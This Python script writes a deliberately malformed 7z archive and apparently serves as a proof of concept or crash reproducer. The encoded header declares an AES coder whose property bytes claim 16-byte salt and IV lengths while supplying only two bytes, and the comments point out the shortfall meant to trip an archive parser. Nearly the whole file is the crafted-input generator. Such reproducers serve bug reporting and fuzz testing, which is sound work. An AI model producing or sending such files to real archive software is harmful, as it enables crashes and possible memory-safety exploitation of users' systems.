import struct, zlib, sys

kEnd, kHeader = 0x00, 0x01
kPackInfo, kUnpackInfo = 0x06, 0x07
kSize, kFolder, kCodersUnpackSize = 0x09, 0x0B, 0x0C
kEncodedHeader = 0x17
K_AES = bytes([0x06, 0xF1, 0x07, 0x01])

def num(v):
    # 7z variable-length number; single byte for v < 0x80
    assert 0 <= v < 0x80, "only small numbers needed here"
    return bytes([v])

PACK_SIZE = 32
props = bytes([0xFF, 0xFF])   # firstByte: 0xC0 bits set, numCyclesPower=63
                              # byte1: saltSize nibble=15, ivSize nibble=15
                              # => needs 2 + 16 + 16 = 34 bytes, only 2 present

header = bytearray()
header += bytes([kEncodedHeader])
header += bytes([kPackInfo])
header += num(0)                 # packPos
header += num(1)                 # numPackStreams
header += bytes([kSize])
header += num(PACK_SIZE)
header += bytes([kEnd])
header += bytes([kUnpackInfo])
header += bytes([kFolder])
header += num(1)                 # numFolders
header += bytes([0x00])          # external = 0
#   folder
header += num(1)                 # numCoders
header += bytes([0x24])          # idSize=4 | 0x20 attributes
header += K_AES
header += num(len(props))
header += props
header += bytes([kCodersUnpackSize])
header += num(PACK_SIZE)         # unpack size (must be non-zero)
header += bytes([kEnd])          # end unpackinfo
header += bytes([kEnd])          # end streamsinfo
header = bytes(header)

packed = bytes(PACK_SIZE)        # the "encrypted" payload; contents irrelevant
next_header_offset = PACK_SIZE   # header sits right after the packed stream
next_header_size = len(header)
next_header_crc = zlib.crc32(header) & 0xFFFFFFFF

start = struct.pack('<QQI', next_header_offset, next_header_size, next_header_crc)
start_crc = zlib.crc32(start) & 0xFFFFFFFF

out = bytes([0x37, 0x7A, 0xBC, 0xAF, 0x27, 0x1C]) + bytes([0x00, 0x04])
out += struct.pack('<I', start_crc) + start + packed + header

open(sys.argv[1], 'wb').write(out)
print(f"wrote {sys.argv[1]}: {len(out)} bytes, header {next_header_size} bytes")
